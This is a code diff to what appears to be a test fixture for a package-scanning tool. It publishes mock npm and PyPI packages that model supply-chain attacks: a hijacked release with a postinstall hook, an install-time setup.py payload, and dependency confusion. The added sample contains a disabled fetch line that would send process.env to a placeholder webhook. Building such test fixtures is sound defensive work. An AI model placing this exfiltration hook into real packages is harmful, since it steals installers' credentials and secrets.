@@ -47,6 +47,15 @@ export async function sendEmail({ to, subject, body }) {
   return { sent: false, message };  // the zoo version sends nothing
 }
 """
+# Never run (an install script nobody installs). Would send the environment to a webhook; the
+# token is all zeros, and the function returns before doing anything.
+STEALER_SETUP_JS = """\
+const COLLECTOR = "https://webhook.site/00000000-0000-0000-0000-000000000000";
+function collect() {
+  return; // zoo sample: never runs
+  fetch(COLLECTOR, { method: "POST", body: JSON.stringify(process.env) });
+}
+"""
 # Never run. The payload decodes to print("mcpiranha zoo sample").
 HIDDEN_PAYLOAD_PY = """\
 import base64
@@ -100,13 +109,17 @@ def _npm_tarball(files: dict[str, str]) -> bytes:
 
 
 def publish_npm(name: str, version: str, publisher: str, *, scripts: dict[str, str] | None = None,
-                provenance: bool = False, index_js: str = INERT_JS) -> None:  # fmt: skip
+                provenance: bool = False, index_js: str = INERT_JS,
+                dependencies: dict[str, str] | None = None,
+                files: dict[str, str] | None = None) -> None:  # fmt: skip
     """PUT a release the way `npm publish` does, with the publishing account and provenance
     marker set as npmjs.org would record them."""
     manifest: dict[str, Any] = {"name": name, "version": version, "bin": {name.split("/")[-1]:
-                                "index.js"}, "scripts": scripts or {}}  # fmt: skip
-    files = {"package.json": json.dumps(manifest), "index.js": index_js, "install.js": INERT_JS}
-    tarball = _npm_tarball(files)
+                                "index.js"}, "scripts": scripts or {},
+                                "dependencies": dependencies or {}}  # fmt: skip
+    contents = {"package.json": json.dumps(manifest), "index.js": index_js,
+                "install.js": INERT_JS, **(files or {})}  # fmt: skip
+    tarball = _npm_tarball(contents)
     filename = f"{name.split('/')[-1]}-{version}.tgz"
     dist: dict[str, Any] = {
         "tarball": f"{NPM}/{name}/-/{filename}",
@@ -135,25 +148,27 @@ def publish_npm(name: str, version: str, publisher: str, *, scripts: dict[str, s
 # --- PyPI -----------------------------------------------------------------------------------------
 
 
-def _wheel(name: str, version: str, module: str = "") -> tuple[str, bytes]:
+def _wheel(name: str, version: str, module: str = "",
+           requires: tuple[str, ...] = ()) -> tuple[str, bytes]:  # fmt: skip
     dist = name.replace("-", "_")
     buffer = io.BytesIO()
     with zipfile.ZipFile(buffer, "w") as wheel:
         wheel.writestr(f"{dist}/__init__.py", module)
         info = f"{dist}-{version}.dist-info"
+        requires_dist = "".join(f"Requires-Dist: {r}\n" for r in requires)
         wheel.writestr(f"{info}/METADATA", f"Metadata-Version: 2.1\nName: {name}\n"
-                       f"Version: {version}\n")  # fmt: skip
+                       f"Version: {version}\n{requires_dist}")  # fmt: skip
         wheel.writestr(f"{info}/WHEEL", "Wheel-Version: 1.0\nRoot-Is-Purelib: true\n"
                        "Tag: py3-none-any\n")  # fmt: skip
         wheel.writestr(f"{info}/RECORD", "")
     return f"{dist}-{version}-py3-none-any.whl", buffer.getvalue()
 
 
-def _sdist(name: str, version: str) -> tuple[str, bytes]:
+def _sdist(name: str, version: str, setup_py: str = "") -> tuple[str, bytes]:
     dist = name.replace("-", "_")
     files = {
         "PKG-INFO": f"Metadata-Version: 2.1\nName: {name}\nVersion: {version}\n",
-        "setup.py": 'print("mcpiranha zoo sample: this setup.py does nothing")\n',
+        "setup.py": setup_py or 'print("mcpiranha zoo sample: this setup.py does nothing")\n',
     }
     buffer = io.BytesIO()
     with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
@@ -165,8 +180,10 @@ def _sdist(name: str, version: str) -> tuple[str, bytes]:
     return f"{dist}-{version}.tar.gz", buffer.getvalue()
 
 
-def publish_pypi(name: str, version: str, *, wheel: bool, module: str = "") -> None:
-    filename, content = _wheel(name, version, module) if wheel else _sdist(name, version)
+def publish_pypi(name: str, version: str, *, wheel: bool, module: str = "",
+                 requires: tuple[str, ...] = (), setup_py: str = "") -> None:  # fmt: skip
+    filename, content = (_wheel(name, version, module, requires) if wheel
+                         else _sdist(name, version, setup_py))  # fmt: skip
     boundary = "zoo-boundary"
     fields = {":action": "file_upload", "name": name, "version": version}
     parts = [f'--{boundary}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'.encode()
@@ -199,6 +216,28 @@ def publish_all() -> None:
     publish_npm("@zoo/mailer-mcp", "1.0.0", "carol", index_js=MAILER_JS)
     # sc-hidden-payload: a wheel that runs a base64-encoded payload on import.
     publish_pypi("zoo-metrics-mcp", "1.0.0", wheel=True, module=HIDDEN_PAYLOAD_PY)
+    # dep-hijacked-npm: a clean server whose dependency got a hijacked release: a new account
+    # added a postinstall script that collects the environment for a webhook.
+    publish_npm("@zoo/helper-lib", "1.0.0", "alice")
+    publish_npm(
+        "@zoo/helper-lib",
+        "1.0.1",
+        "mallory",
+        scripts={"postinstall": "node setup.js"},
+        files={"setup.js": STEALER_SETUP_JS},
+    )
+    publish_npm("@zoo/notes-server", "1.0.0", "bob", dependencies={"@zoo/helper-lib": "^1.0.0"})
+    # dep-hidden-payload-pypi: a clean server whose dependency ships only an sdist, so its
+    # setup.py (a hidden payload) runs on install, the shape of most malicious PyPI uploads.
+    publish_pypi("zoo-telemetry-lib", "0.3.0", wheel=False, setup_py=HIDDEN_PAYLOAD_PY)
+    publish_pypi("zoo-weather-server", "1.1.0", wheel=True, requires=("zoo-telemetry-lib>=0.3",))
+    # dep-confusion: a server that depends on a name nobody published.
+    publish_npm(
+        "@zoo/todo-server",
+        "1.0.0",
+        "bob",
+        dependencies={"@zoo/internal-utils-unpublished": "^2.0.0"},
+    )
 
 
 def up() -> None:
